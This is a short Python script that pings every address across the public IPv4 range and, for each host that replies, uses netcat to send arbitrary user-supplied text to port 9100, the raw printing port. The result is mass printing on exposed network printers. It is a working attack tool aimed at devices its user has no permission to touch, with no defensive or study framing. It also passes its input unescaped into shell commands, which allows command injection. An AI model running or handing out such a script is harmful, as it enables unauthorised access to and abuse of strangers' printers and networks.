import sys
import os
import subprocess
from threading import Thread
from netaddr import iter_iprange
import threading
IP_range_Start = "1.0.0.0"
IP_range_Stop = "255.255.255.254"
try:
    words = sys.argv[1]
    thread_limit = int(sys.argv[2])
except:
    print ('script.py <words> <threads>')
    exit()
threadLock = threading.Lock()
with threadLock:
    generator = iter_iprange(IP_range_Start, IP_range_Stop, step=1)
def printit(num):
    for ips in generator:
            print ('Worker: %s Printing on - %s'%(num,ips))
            response = os.system("ping -w 1 -c 1 " + str(ips) + " > /var/tmp/printme/ping.log")
            if response == 0:
                stdout = subprocess.getoutput('echo "%s" | netcat -w 3 %s 9100'%(words,str(ips)))
            else:
                pass


threads = []
for i in range(thread_limit):
    t = threading.Thread(target=printit, args=(i,))
    threads.append(t)
    t.start()
